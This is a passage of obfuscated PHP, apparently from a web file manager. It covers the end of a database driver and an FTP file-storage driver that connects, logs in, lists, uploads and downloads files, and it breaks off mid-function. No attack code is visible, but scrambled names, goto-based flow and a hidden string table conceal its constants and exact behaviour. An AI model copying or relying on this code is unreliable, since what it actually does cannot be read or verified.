getTables($Dõ’‚ÊóŒÒ = '') { $C⁄ﬂ‰â‚Œ˘ =& $_SERVER[—Ω]; $dååï ÖÍ = !empty($Dõ’‚ÊóŒÒ) ? $C⁄ﬂ‰â‚Œ˘[817] . $Dõ’‚ÊóŒÒ : $C⁄ﬂ‰â‚Œ˘[818]; $AƒœÕè¿Ø∑ = $this->query($dååï ÖÍ); $fÇ˜ÀÒÖöÒ = array(); if ($AƒœÕè¿Ø∑) { foreach ($AƒœÕè¿Ø∑ as $fæºœå◊±é => $b‡¬≠‘«±Í) { $fÇ˜ÀÒÖöÒ[$fæºœå◊±é] = current($b‡¬≠‘«±Í); } } return $fÇ˜ÀÒÖöÒ; } public function replace($CË≈ßú÷öá, $f∏Œ¿îø”ë = array()) { $A˜‰⁄ï⁄Õ  =& $_SERVER[—Ω]; foreach ($CË≈ßú÷öá as $B¡Â§ä»∆ => $Eﬁ¶æ¿û¬∂) { $AÑ°íÌÉ÷± = $this->parseValue($Eﬁ¶æ¿û¬∂); if (is_scalar($AÑ°íÌÉ÷±)) { $dçÊ⁄âπÕæ[] = $AÑ°íÌÉ÷±; $a‰±œÔÒ©î[] = $this->parseKey($B¡Â§ä»∆); } } $d—¶à∂ääœ = $A˜‰⁄ï⁄Õ [819] . $this->parseTable($f∏Œ¿îø”ë[$A˜‰⁄ï⁄Õ [264]]) . $A˜‰⁄ï⁄Õ [820] . implode($A˜‰⁄ï⁄Õ [47], $a‰±œÔÒ©î) . $A˜‰⁄ï⁄Õ [821] . implode($A˜‰⁄ï⁄Õ [47], $dçÊ⁄âπÕæ) . $A˜‰⁄ï⁄Õ [822]; return $this->execute($d—¶à∂ääœ); } public function insertAll($FÇ√€À‘˘Û, $fﬂ€É®≤çÉ = array(), $AÙÿ®∆ßÖè = false) { goto e∞§…–øÓá; D±Ñıœÿ¬´: $A”ÎÒã´ëõ = ($AÙÿ®∆ßÖè ? $C÷úãÒå«[824] : $C÷úãÒå«[825]) . $C÷úãÒå«[826] . $this->parseTable($fﬂ€É®≤çÉ[$C÷úãÒå«[264]]) . $C÷úãÒå«[820] . implode($C÷úãÒå«[47], $E•ç◊ΩáÉª) . $C÷úãÒå«[827] . implode($C÷úãÒå«[47], $dáøﬁû°¥ª); return $this->execute($A”ÎÒã´ëõ); goto CúØä’´ö•; FÌ»„Ö¶çä: $dáøﬁû°¥ª = array(); foreach ($FÇ√€À‘˘Û as $bœìıè∑Ñ—) { $eØãÆõ‘» = array(); foreach ($bœìıè∑Ñ— as $bé≥–êÆº∂ => $cèÙ∫È€Çı) { $cèÙ∫È€Çı = $this->parseValue($cèÙ∫È€Çı); if (is_scalar($cèÙ∫È€Çı)) { $eØãÆõ‘»[] = $cèÙ∫È€Çı; } } $dáøﬁû°¥ª[] = $C÷úãÒå«[245] . implode($C÷úãÒå«[47], $eØãÆõ‘») . $C÷úãÒå«[822]; } array_walk($E•ç◊ΩáÉª, array($this, $C÷úãÒå«[823])); goto D±Ñıœÿ¬´; e∞§…–øÓá: $C÷úãÒå« =& $_SERVER[—Ω]; if (!is_array($FÇ√€À‘˘Û[0])) { return !1; } $E•ç◊ΩáÉª = array_keys($FÇ√€À‘˘Û[0]); goto FÌ»„Ö¶çä; CúØä’´ö•: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EﬁÖˆﬂû∆≈ =& $_SERVER[—Ω]; $this->error = $this->_linkID->errno . $EﬁÖˆﬂû∆≈[4] . $this->_linkID->error; if ($EﬁÖˆﬂû∆≈[33] != $this->queryStr) { $this->error .= LNG($EﬁÖˆﬂû∆≈[45]) . $this->queryStr; } think_trace($this->error, $EﬁÖˆﬂû∆≈[33], $EﬁÖˆﬂû∆≈[46]); return $this->error; } public function escapeString($f°áì¨∏Ñò) { if ($this->_linkID) { return $this->_linkID->real_escape_string($f°áì¨∏Ñò); } else { return addslashes($f°áì¨∏Ñò); } } public function parseKey(&$Dí∏åùÁùÕ, $F©‘≤π•Æ® = true) { $b∞ƒòƒêéƒ =& $_SERVER[—Ω]; if ($F©‘≤π•Æ®) { $Dí∏åùÁùÕ = $this->parseKeyCheck($Dí∏åùÁùÕ); } if ($Dí∏åùÁùÕ != $b∞ƒòƒêéƒ[173] && !preg_match($b∞ƒòƒêéƒ[828], $Dí∏åùÁùÕ)) { $Dí∏åùÁùÕ = $b∞ƒòƒêéƒ[829] . trim($Dí∏åùÁùÕ, $b∞ƒòƒêéƒ[829]) . $b∞ƒòƒêéƒ[829]; } return $Dí∏åùÁùÕ; } } goto AïúãÆÙËñ; eº±´öˆ∂ú: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($cıÆÒ◊â·—) { parent::__construct(); if (count($cıÆÒ◊â·—) > 0) { $this->_init($cıÆÒ◊â·—); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($D¶¥èù≠∆ã) { $D“á±“äò‡ =& $_SERVER[—Ω]; global $config; $this->appCharset = $config[$D“á±“äò‡[1148]]; $this->systemCharset = $config[$D“á±“äò‡[1149]]; if (isset($D¶¥èù≠∆ã[$D“á±“äò‡[1150]]) && $D¶¥èù≠∆ã[$D“á±“äò‡[1150]]) { $this->systemCharset = $D¶¥èù≠∆ã[$D“á±“äò‡[1150]]; } } public function iconvApp($e◊∏Ú›‹”æ) { return $this->iconvTo($e◊∏Ú›‹”æ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Eò•Ã‡ÿâè) { return $this->iconvTo($Eò•Ã‡ÿâè, $this->appCharset, $this->systemCharset); } public function getPathOuter($a–π≤ëú∑ÿ) { goto fíè®ƒ⁄±˘; fíè®ƒ⁄±˘: $cÂﬂØ∆Âò◊ =& $_SERVER[—Ω]; $cÁªãÏï¡ = $this->iconvApp($this->pathBase); $a–π≤ëú∑ÿ = $this->iconvApp($a–π≤ëú∑ÿ); goto F†ÊÖπ»ê∂; e©áò˘…Ç÷: $a–π≤ëú∑ÿ = KodIO::clear($a–π≤ëú∑ÿ); $a–π≤ëú∑ÿ = substr($a–π≤ëú∑ÿ, strlen($cÁªãÏï¡)); if (empty($this->pathDriver)) { return $a–π≤ëú∑ÿ; } goto A†‚–ÕÒÏò; A†‚–ÕÒÏò: return $this->pathDriver . $cÂﬂØ∆Âò◊[8] . ltrim($a–π≤ëú∑ÿ, $cÂﬂØ∆Âò◊[8]); goto BÏãéØ„∆„; F†ÊÖπ»ê∂: if (substr($cÁªãÏï¡, 0, 2) == $cÂﬂØ∆Âò◊[1151]) { $cÁªãÏï¡ = BASIC_PATH . substr($cÁªãÏï¡, 2); } if (substr($a–π≤ëú∑ÿ, 0, 2) == $cÂﬂØ∆Âò◊[1151]) { $a–π≤ëú∑ÿ = BASIC_PATH . substr($a–π≤ëú∑ÿ, 2); } $cÁªãÏï¡ = KodIO::clear($cÁªãÏï¡); goto e©áò˘…Ç÷; BÏãéØ„∆„: } private function _init($dŒéÍŒÑÙ– = array()) { goto eÛ⁄ê‰≠πÕ; c∑à´Æ ºÉ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $BÈŸàåÉŸô[$EóÑ„çì√÷] = array($bÓ∆åóÿÙÍ[1157] => $this->connect, $bÓ∆åóÿÙÍ[166] => $this->host, $bÓ∆åóÿÙÍ[165] => $this->scheme, $bÓ∆åóÿÙÍ[167] => $this->port); goto CˆΩáæâÇ´; Bê”Ω∂ê „: foreach ($dŒéÍŒÑÙ– as $a¢¥ÍØö«´ => $f¨‹Æ¶µëÖ) { if (isset($this->{$a¢¥ÍØö«´})) { $this->{$a¢¥ÍØö«´} = $f¨‹Æ¶µëÖ; } } static $BÈŸàåÉŸô = array(); $EóÑ„çì√÷ = md5(json_encode($dŒéÍŒÑÙ–)); goto cèÏ…ÕÑ®∏; BÿÂçªœ€Ç: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $Bë≥Ø¯ü⁄œ = @ftp_login($this->connect, $this->username, $this->userpass); goto c∑à´Æ ºÉ; cèÏ…ÕÑ®∏: if (isset($BÈŸàåÉŸô[$EóÑ„çì√÷])) { foreach ($BÈŸàåÉŸô[$EóÑ„çì√÷] as $a¢¥ÍØö«´ => $f¨‹Æ¶µëÖ) { $this->{$a¢¥ÍØö«´} = $f¨‹Æ¶µëÖ; } return !0; } $Aëêº‰éë = parse_url(trim($this->server, $bÓ∆åóÿÙÍ[8])); $this->host = $Aëêº‰éë[$bÓ∆åóÿÙÍ[166]]; goto Aìí¨®®ûè; Aìí¨®®ûè: $bñèíØ≤¥“ = isset($Aëêº‰éë[$bÓ∆åóÿÙÍ[165]]) && $Aëêº‰éë[$bÓ∆åóÿÙÍ[165]] == $bÓ∆åóÿÙÍ[1154] ? !0 : !1; $this->scheme = $bñèíØ≤¥“ ? $bÓ∆åóÿÙÍ[1155] : $bÓ∆åóÿÙÍ[1156]; $this->port = isset($Aëêº‰éë[$bÓ∆åóÿÙÍ[167]]) ? $Aëêº‰éë[$bÓ∆åóÿÙÍ[167]] : 21; goto BÿÂçªœ€Ç; CˆΩáæâÇ´: return $Bë≥Ø¯ü⁄œ; goto cú≤≥§âêù; eÛ⁄ê‰≠πÕ: $bÓ∆åóÿÙÍ =& $_SERVER[—Ω]; if (!function_exists($bÓ∆åóÿÙÍ[1152])) { show_json(LNG($bÓ∆åóÿÙÍ[1153]), !1); } $this->charsetReset($dŒéÍŒÑÙ–); goto Bê”Ω∂ê „; cú≤≥§âêù: } private function _isconn() { return is_resource($this->connect); } public function mkfile($a˘≈‹©µ§Ê, $Fùêµﬂ€∞˘ = '', $F…Ì–‚≈´◊ = REPEAT_RENAME) { if ($this->setContent($a˘≈‹©µ§Ê, $Fùêµﬂ€∞˘)) { return $this->getPathOuter($a˘≈‹©µ§Ê); } return !1; } public function mkdir($Cü•äŸ·É∫, $C≥˜§¯≈´∏ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Cü•äŸ·É∫ = $this->iconvSystem($Cü•äŸ·É∫); if ($this->isFolder($Cü•äŸ·É∫) || @ftp_mkdir($this->connect, $Cü•äŸ·É∫)) { return $this->getPathOuter($Cü•äŸ·É∫); } if (!$this->mkdir($this->pathFather($Cü•äŸ·É∫))) { return !1; } if ($Cü•äŸ·É∫ = @ftp_mkdir($this->connect, $Cü•äŸ·É∫)) { return $this->getPathOuter($Cü•äŸ·É∫); } return !1; } public function copyFile($dç®í„Ω”¿, $C∫∏Ñêö—å) { goto A¯ﬁÚÔƒ⁄¥; Då«§˘œ‡·: $B∑àﬂö≥ì‚ = $this->iconvApp($EúïÙºõúº); $this->download($dç®í„Ω”¿, $B∑àﬂö≥ì‚); $dü”∑‡ïïé = $this->upload($C∫∏Ñêö—å, $B∑àﬂö≥ì‚); goto FçæÒöªé’; A¯ﬁÚÔƒ⁄¥: if (!$this->_isconn()) { return !1; } $aÊÉ—Ç§ºê = $this->pathThis($this->iconvSystem($dç®í„Ω”¿)); $EúïÙºõúº = $this->tempFile($aÊÉ—Ç§ºê); goto Då«§˘œ‡·; FçæÒöªé’: $this->tempFileRemve($EúïÙºõúº); return $dü”∑‡ïïé; goto fãÒÂß¯Ùç; fãÒÂß¯Ùç: } public function moveFile($eÏﬁ…ÜÇÈ«, $eØıØìˆ˘Æ) { if (!$this->_isconn()) { return !1; } $eÏﬁ…ÜÇÈ« = $this->iconvSystem($eÏﬁ…ÜÇÈ«); $eØıØìˆ˘Æ = $this->iconvSystem($eØıØìˆ˘Æ); $d≤¿ö≈ÜÁ£ = @ftp_rename($this->connect, $eÏﬁ…ÜÇÈ«, $eØıØìˆ˘Æ); return $d≤¿ö≈ÜÁ£ ? $this->getPathOuter($eØıØìˆ˘Æ) : !1; } public function delFile($cè¡≥Ù´Ò€) { if (!$this->_isconn()) { return !1; } $cè¡≥Ù´Ò€ = $this->iconvSystem($cè¡≥Ù´Ò€); return @ftp_delete($this->connect, $cè¡≥Ù´Ò€); } public function delFolder($fœêÑ“Ò∑À) { if (!$this->_isconn()) { return !1; } $fœêÑ“Ò∑À = $this->iconvSystem($fœêÑ“Ò∑À); $BÈáõ∞˜¿ï = $this->ftpList($fœêÑ“Ò∑À); if (!$BÈáõ∞˜¿ï) { return @ftp_rmdir($this->connect, $fœêÑ“Ò∑À); } foreach ($BÈáõ∞˜¿ï as $D±ÿûò∫≥ª) { if ($this->isFolder($D±ÿûò∫≥ª)) { $D±ÿûò∫≥ª = $this->iconvApp($D±ÿûò∫≥ª); $this->delFolder($D±ÿûò∫≥ª); } else { @ftp_delete($this->connect, $D±ÿûò∫≥ª); } } return @ftp_rmdir($this->connect, $fœêÑ“Ò∑À); } public function rename($D ˆ—È∂Ñ®, $eÔàÇá†πå) { goto A€ÎïŒÍø√; A€ÎïŒÍø√: $e…Ãçäé¡¯ =& $_SERVER[—Ω]; if (!$this->_isconn()) { return !1; } $cÉÊÀ—†éÖ = $this->fileNameAuto($this->pathFather($D ˆ—È∂Ñ®), $eÔàÇá†πå); goto AÈÍΩÖ£•‹; E¶ãéÈïÓÑ: $bÏ’òäﬂ§¥ = rtrim($eëÌ≤§Ω∫û, $e…Ãçäé¡¯[8]) . $e…Ãçäé¡¯[8] . $cÉÊÀ—†éÖ; $fŸé¶Ñæ©∂ = @ftp_rename($this->connect, $D ˆ—È∂Ñ®, $bÏ’òäﬂ§¥); $bÏ’òäﬂ§¥ = $this->iconvApp($bÏ’òäﬂ§¥); goto dÂ°€ıì±Ï; AÈÍΩÖ£•‹: $cÉÊÀ—†éÖ = $this->iconvSystem($cÉÊÀ—†éÖ); $D ˆ—È∂Ñ® = $this->iconvSystem($D ˆ—È∂Ñ®); $eëÌ≤§Ω∫û = $this->pathFather($D ˆ—È∂Ñ®); goto E¶ãéÈïÓÑ; dÂ°€ıì±Ï: return $fŸé¶Ñæ©∂ ? $this->getPathOuter($bÏ’òäﬂ§¥) : !1; goto cÀùµœªãº; cÀùµœªãº: } private function folderInfo($c≠∫…ÇÀ≠ñ, $A±ÓáﬂÖÇ· = false) { goto cÒÚôéÑâ…; aàîÔ›•Ñ§: return $bëßà€àº˜; goto Dé¥¢´åÖ•; dì°ÉàÛâó: $BÏ€—∆óâµ = $this->iconvSystem($c≠∫…ÇÀ≠ñ); if ($A±ÓáﬂÖÇ·) { return array($a“‘Ñ«êŒ‰[28] => $a¶˜à”™ÿò, $a“‘Ñ«êŒ‰[75] => $d˘ú”‰ﬂ’È, $a“‘Ñ«êŒ‰[29] => $a“‘Ñ«êŒ‰[76]); } $bëßà€àº˜ = array($a“‘Ñ«êŒ‰[28] => $a¶˜à”™ÿò, $a“‘Ñ«êŒ‰[75] => $d˘ú”‰ﬂ’È, $a“‘Ñ«êŒ‰[29] => $a“‘Ñ«êŒ‰[76], $a“‘Ñ«êŒ‰[184] => 0, $a“‘Ñ«êŒ‰[107] => 0, $a“‘Ñ«êŒ‰[1158] => !0, $a“‘Ñ«êŒ‰[1159] => !0); goto aàîÔ›•Ñ§; cÒÚôéÑâ…: $a“‘Ñ«êŒ‰ =& $_SERVER[—Ω]; $d˘ú”‰ﬂ’È = $this->getPathOuter(rtrim($c≠∫…ÇÀ≠ñ, $a“‘Ñ«êŒ‰[8])); $a¶˜à”™ÿò = $this->pathThis($d˘ú”‰ﬂ’È); goto dì°ÉàÛâó; Dé¥¢´åÖ•: } private function fileInfo($f£Ê‚ò≈âó, $Cøèêì« † = false) { goto E÷äØÂ·âÔ; cµü…¡⁄áØ: $DóÕñø‡‡π = $this->iconvSystem($f£Ê‚ò≈âó); if ($Cøèêì« †) { return array($C¬æÊè∑≤ä[28] => $E¡—¢ïî¡», $C¬æÊè∑≤ä[75] => $AÔÈó¶¯‰”, $C¬æÊè∑≤ä[29] => $C¬æÊè∑≤ä[164], $C¬æÊè∑≤ä[157] => $this->ext($f£Ê‚ò≈âó), $C¬æÊè∑≤ä[77] => $this->size($f£Ê‚ò≈âó)); } $c£˜œÙâÂÇ = array($C¬æÊè∑≤ä[28] => $E¡—¢ïî¡», $C¬æÊè∑≤ä[75] => $AÔÈó¶¯‰”, $C¬æÊè∑≤ä[29] => $C¬æÊè∑≤ä[164], $C¬æÊè∑≤ä[184] => 0, $C¬æÊè∑≤ä[107] => @ftp_mdtm($this->connect, $DóÕñø‡‡π), $C¬æÊè∑≤ä[157] => $this->ext($f£Ê‚ò≈âó), $C¬æÊè∑≤ä[77] => $this->size($f£Ê‚ò≈âó), $C¬æÊè∑≤ä[1158] => !0, $C¬æÊè∑≤ä[1159] => !0); goto aØîÊ´£ΩË; E÷äØÂ·âÔ: $C¬æÊè∑≤ä =& $_SERVER[—Ω]; $AÔÈó¶¯‰” = $this->getPathOuter(rtrim($f£Ê‚ò≈âó, $C¬æÊè∑≤ä[8])); $E¡—¢ïî¡» = $this->pathThis($AÔÈó¶¯‰”); goto cµü…¡⁄áØ; aØîÊ´£ΩË: $c£˜œÙâÂÇ[$C¬æÊè∑≤ä[107]] = $c£˜œÙâÂÇ[$C¬æÊè∑≤ä[107]] > 0 ? $c£˜œÙâÂÇ[$C¬æÊè∑≤ä[107]] : 0; return $c£˜œÙâÂÇ; goto Fﬂ˘ÈÉäª‹; Fﬂ˘ÈÉäª‹: } public function size($Aœ˜∏´è∆Ò) { $DÃÀÛÈàÒ≤ = $this->objectMeta($Aœ˜∏´è∆Ò); return $DÃÀÛÈàÒ≤ ? $DÃÀÛÈàÒ≤[$_SERVER[—Ω][77]] : 0; } public function info($CÓâµ˘åç≈) { if ($this->isFile($CÓâµ˘åç≈)) { return $this->fileInfo($CÓâµ˘åç≈, 0); } else { if ($this->isFolder($CÓâµ˘åç≈)) { return $this->folderInfo($CÓâµ˘åç≈); } } return !1; } public function exist($A÷ÖÒÑ–Ùó) { return $this->objectMeta($A÷ÖÒÑ–Ùó) ? !0 : !1; } public function isFile($eÑØº∆∆â) { $fê·´¡†ﬂƒ =& $_SERVER[—Ω]; $Eß–‘¥ˆπØ = $this->objectMeta($eÑØº∆∆â); return $Eß–‘¥ˆπØ ? $Eß–‘¥ˆπØ[$fê·´¡†ﬂƒ[29]] == $fê·´¡†ﬂƒ[164] : !1; } public function isFolder($dã„Ç¬® —) { $cõ¨ƒ÷éà‹ =& $_SERVER[—Ω]; $fπ√ÓŸ’œ“ = $this->objectMeta($dã„Ç¬® —); return $fπ√ÓŸ’œ“ ? $fπ√ÓŸ’œ“[$cõ¨ƒ÷éà‹[29]] == $cõ¨ƒ÷éà‹[76] : !1; } public function listPath($bπ–îœá›π, $B  óèÁòº = false) { goto cΩÿè‰ËÓ“; CµŸÜ¯ö›â: foreach ($Cú⁄çÌ¢€ˆ as $bπ–îœá›π) { if ($this->isFolder($bπ–îœá›π)) { $B®æñÇ≥ô»[$E€†º‚©∑[74]][] = $this->folderInfo($bπ–îœá›π, $B  óèÁòº); } else { $B®æñÇ≥ô»[$E€†º‚©∑[73]][] = $this->fileInfo($bπ–îœá›π, $B  óèÁòº); } } return $B®æñÇ≥ô»; goto Eö£ˆ†’ﬂ˜; cΩÿè‰ËÓ“: $E€†º‚©∑ =& $_SERVER[—Ω]; if (!$this->_isconn()) { return !1; } $bπ–îœá›π = $this->iconvSystem($bπ–îœá›π); goto Fö£Íú‚ﬁã; Fö£Íú‚ﬁã: $Cú⁄çÌ¢€ˆ = $this->ftpList($bπ–îœá›π); $B®æñÇ≥ô» = array($E€†º‚©∑[74] => array(), $E€†º‚©∑[73] => array()); if (!$Cú⁄çÌ¢€ˆ) { return $B®æñÇ≥ô»; } goto CµŸÜ¯ö›â; Eö£ˆ†’ﬂ˜: } public function has($cëœà¶ßı·, $BÑ∂∞≥¿…à = false, $B∆û÷⁄ÒŒ° = true) { goto aÉ∏≤√≠≈Ô; dêÇ¢Ñ™èè: foreach ($aîπ“åÜÁ• as $cëœà¶ßı·) { if ($B∆û÷⁄ÒŒ°) { if (!$this->isFolder($cëœà¶ßı·)) { return !0; } } else { if ($this->isFolder($cëœà¶ßı·)) { return !0; } } } return !1; goto c∑†´Óß≠Ö; aÉ∏≤√≠≈Ô: $C¨Ó›’«’„ =& $_SERVER[—Ω]; if (!$this->_isconn()) { return !1; } $cëœà¶ßı· = $this->iconvSystem($cëœà¶ßı·); goto f£¢ö÷á¢ë; f£¢ö÷á¢ë: $aîπ“åÜÁ• = $this->ftpList($cëœà¶ßı·); if (!$aîπ“åÜÁ•) { return !1; } if ($BÑ∂∞≥¿…à) { return array($C¨Ó›’«’„[188] => 0, $C¨Ó›’«’„[189] => count($aîπ“åÜÁ•)); } goto dêÇ¢Ñ™èè; c∑†´Óß≠Ö: } public function listAll($c¯º®∏∑µ¬) { goto döø–Âåƒ≥; döø–Âåƒ≥: $F∂‹¥öõ‹‘ =& $_SERVER[—Ω]; if (!$this->_isconn()) { return !1; } $c¯º®∏∑µ¬ = $this->iconvSystem($c¯º®∏∑µ¬); goto EÏï≈ƒ„õÇ; EÏï≈ƒ„õÇ: $DÈ¯ÈÁ°Ø = array($F∂‹¥öõ‹‘[73] => array(), $F∂‹¥öõ‹‘[74] => array()); $this->recursionFtpFiles($c¯º®∏∑µ¬, $DÈ¯ÈÁ°Ø); $aà±Œ∑·Ç∞ = array(); goto A‚¬ÓÃ†Õ◊; A‚¬ÓÃ†Õ◊: foreach ($DÈ¯ÈÁ°Ø[$F∂‹¥öõ‹‘[74]] as $F«√∆¥¬≈≥) { $aà±Œ∑·Ç∞[] = array($F∂‹¥öõ‹‘[75] => $F∂‹¥öõ‹‘[8] . trim(str_replace($c¯º®∏∑µ¬, $F∂‹¥öõ‹‘[33], $F«√∆¥¬≈≥), $F∂‹¥öõ‹‘[8]) . $F∂‹¥öõ‹‘[8], $F∂‹¥öõ‹‘[76] => 1, $F∂‹¥öõ‹‘[77] => 0); } foreach ($DÈ¯ÈÁ°Ø[$F∂‹¥öõ‹‘[73]] as $CÿÉÖâ·®˘) { $aà±Œ∑·Ç∞[] = array($F∂‹¥öõ‹‘[75] => $F∂‹¥öõ‹‘[8] . trim(str_replace($c¯º®∏∑µ¬, $F∂‹¥öõ‹‘[33], $CÿÉÖâ·®˘), $F∂‹¥öõ‹‘[8]), $F∂‹¥öõ‹‘[76] => 0, $F∂‹¥öõ‹‘[77] => $this->size($CÿÉÖâ·®˘)); } return $aà±Œ∑·Ç∞; goto AªÙ∏ÇÓπû; AªÙ∏ÇÓπû: } public function getContent($däÀÎê⁄é…) { if (!$this->_isconn()) { return !1; } $däÀÎê⁄é… = $this->iconvSystem($däÀÎê⁄é…); return $this->fileSubstr($däÀÎê⁄é…); } public function setContent($DΩΩ®¡ÚÒÌ, $Dé‚çÇ∆èØ = '') { goto eº úÛíÿÉ; eº úÛíÿÉ: if (!$this->_isconn()) { return !1; } $FÔé‹È¶ññ = $this->pathThis($this->iconvSystem($DΩΩ®¡ÚÒÌ)); $eèπÎ¬óåò = $this->tempFile($FÔé‹È¶ññ); goto C∑øÌìî¿Í; C∑øÌìî¿Í: file_put_contents($eèπÎ¬óåò, $Dé‚çÇ∆èØ); $d€Ç◊ÀÑñ = $this->upload($DΩΩ®¡ÚÒÌ, $this->iconvApp($eèπÎ¬óåò)); $this->tempFileRemve($eèπÎ¬óåò); goto Aî√éÍÖ·Á; Aî√éÍÖ·Á: return $d€Ç◊ÀÑñ; goto d∂ìÕ˜üÔ¯; d∂ìÕ˜üÔ¯: } public function fileSubstr($f‚µùåÃÏó, $DÆäÔÙ°ƒù = 0, $Eæë’Â˜î“ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($f‚µùåÃÏó, $DÆäÔÙ°ƒù, $Eæë’Â˜î“); } private function ftpRequest($EâÁÂëçºû, $DøÜÉﬁËü… = 0, $Dÿ”±Ç’·¥ = false) { goto AÛØøˆàÕ«; AÛØøˆàÕ«: $EâÁÂëçºû = $this->iconvSystem($EâÁÂëçºû); $BÎÜëùù¯Á = $this->scheme . $this->host . $_SERVER[—Ω][4] . $this->port; $A˜ÀˆÚÉèÌ = curl_init(); goto E•‡¶ÙÊ‘É; Cá„»≤∫¥: return $cﬂ≈áï›∂ö; goto c¨ÿü¥Êñâ; E•‡¶ÙÊ‘É: curl_setopt($A˜ÀˆÚÉèÌ, CURLOPT_URL, $BÎÜëùù¯Á . $this->pathEncode($EâÁÂëçºû)); curl_setopt($A˜ÀˆÚÉèÌ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Dÿ”±Ç’·¥) { $EÃå™ÆÉﬂÌ = $DøÜÉﬁËü… + $Dÿ”±Ç’·¥ - 1; curl_setopt($A˜ÀˆÚÉèÌ, CURLOPT_RANGE, "{$DøÜÉﬁËü…}\x2d{$EÃå™ÆÉﬂÌ}"); } goto B™∑Ü¢ûÊÕ; B™∑Ü¢ûÊÕ: curl_setopt($A˜ÀˆÚÉèÌ, CURLOPT_RETURNTRANSFER, 1); $cﬂ≈áï›∂ö = curl_exec($A˜ÀˆÚÉèÌ); curl_close($A˜ÀˆÚÉèÌ); goto Cá„»≤∫¥; c¨ÿü¥Êñâ: } public function upload($fì¶®òÂÛâ, $b…ü„îãΩç, $cî©Æ¯Æô° = false, $fªµıï“ºÌ = REPEAT_REPLACE) { goto dò‹éÆÃ÷≤; dò‹éÆÃ÷≤: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($fì¶®òÂÛâ))) { return !1; } $fì¶®òÂÛâ = $this->iconvSystem($fì¶®òÂÛâ); goto aæ‹ê¡ÒÓ·; aæ‹ê¡ÒÓ·: $b…ü„îãΩç = $this->iconvSystem($b…ü„îãΩç); $f«äÔôΩ–ÿ = ftp_nb_put($this->connect, $fì¶®òÂÛâ, $b…ü„îãΩç, FTP_BINARY); while ($f«äÔôΩ–ÿ == FTP_MOREDATA) { $f«äÔôΩ–ÿ = ftp_nb_continue($this->connect); } goto d®æ´Â“ƒ˘; d®æ´Â“ƒ˘: if ($f«äÔôΩ–ÿ != FTP_FINISHED) { return !1; } return $this->getPathOuter($fì¶®òÂÛâ); goto aÕ◊˘§∏•¶; aÕ◊˘§∏•¶: } public function download($Føé£•≤ä, $e©‚ÚÑá±‰ = '') { goto fµøà´öﬁ; fµøà´öﬁ: if (!$this->_isconn()) { return !1; } $dó⁄§ç¶®° = $this->pathFather($e©‚ÚÑá±‰); if (!IO::mkdir($dó⁄§ç¶®°)) { return !1; } goto bèΩÚÑ¬éà; bèΩÚÑ¬éà: $Føé£•≤ä = $this->iconvSystem($Føé£•≤ä); $e©‚ÚÑá±‰ = $this->iconvSystem($e©‚ÚÑá±‰); $C¨çÙÛÀ◊⁄ = ftp_nb_get($this->connect, $e©‚ÚÑá±‰, $Føé£•≤ä, FTP_BINARY); goto eØˆçÉäöŒ; eØˆçÉäöŒ: while ($C¨çÙÛÀ◊⁄ == FTP_MOREDATA) { $C¨çÙÛÀ◊⁄ = ftp_nb_continue($this->connect); } if ($C¨çÙÛÀ◊⁄ != FTP_FINISHED) { return !1; } return $this->iconvApp($e©‚ÚÑá±‰); goto c∆¢®≤Èìñ; c∆¢®≤Èìñ: } private function ftpList($a£¿ê§¶õœ) { goto A≤Ï·ˆ™Úœ; Cñ©∫ÕöÊÆ: $a£¿ê§¶õœ = rtrim($a£¿ê§¶õœ, $A»˜ı¨êØ…[8]) . $A»˜ı¨êØ…[8]; $aàç∆ã√È∆ = @ftp_nlist($this->connect, $a£¿ê§¶õœ); if ($aàç∆ã√È∆ === !1) { $aàç∆ã√È∆ = @ftp_rawlist($this->connect, $a£¿ê§¶õœ); foreach ($aàç∆ã√È∆ as $bì÷◊ªêïç => $F·¨êÒ∑èÜ) { $aàç∆ã√È∆[$bì÷◊ªêïç] = end(explode($A»˜ı¨êØ…[1160], $F·¨êÒ∑èÜ)); } } goto a™€ºÚ™†›; A≤Ï·ˆ™Úœ: $A»˜ı¨êØ… =& $_SERVER[—Ω]; if (!$this->isFolder($a£¿ê§¶õœ)) { return !1; } @ftp_chdir($this->connect, $A»˜ı¨êØ…[8]); goto Cñ©∫ÕöÊÆ; a™€ºÚ™†›: $BÈ‚§”ﬁ û = array(); foreach ($aàç∆ã√È∆ as $Bœÿàâ€ë ) { if ($Bœÿàâ€ë  == $A»˜ı¨êØ…[93] || $Bœÿàâ€ë  == $A»˜ı¨êØ…[1161]) { continue; } if (!strstr($Bœÿàâ€ë , $A»˜ı¨êØ…[8])) { $Bœÿàâ€ë  = $a£¿ê§¶õœ . ltrim($Bœÿàâ€ë , $A»˜ı¨êØ…[8]); } $BÈ‚§”ﬁ û[] = $this->iconvApp($Bœÿàâ€ë ); } return $BÈ‚§”ﬁ û; goto d≈ËÔéî∑æ; d≈ËÔéî∑æ: } private function recursionFtpFiles($d÷ä‚û£è, &$c∫Ñ¬ÂËØ§) { $dù«•∂îÎõ =& $_SERVER[—Ω]; if (!$this->_isconn()) { return !1; } if (!($bã£π°«  = $this->ftpList($d÷ä‚û£è))) { return !1; } foreach ($bã£π°«  as $d÷ä‚û£è) { if ($this->isFolder($d÷ä‚û£è)) { $this->recursionFtpFiles($d÷ä‚û£è, $c∫Ñ¬ÂËØ§); $c∫Ñ¬ÂËØ§[$dù«•∂îÎõ[74]][] = $d÷ä‚û£è; } else { $c∫Ñ¬ÂËØ§[$dù«•∂îÎõ[73]][] = $d÷ä‚û£è; } } } private function objectMeta($f–ÛπœâÎ–) { goto fÁ»ÃÔøñ®; fÁ»ÃÔøñ®: $f®ƒ¬˘°¬å =& $_SERVER[—Ω]; $cæ§›õØ≤˘ = $f®ƒ¬˘°¬å[1162] . md5($f–ÛπœâÎ–); $DΩ„ÒÙÏ€ñ = Cache::get($cæ§›õØ≤˘); goto 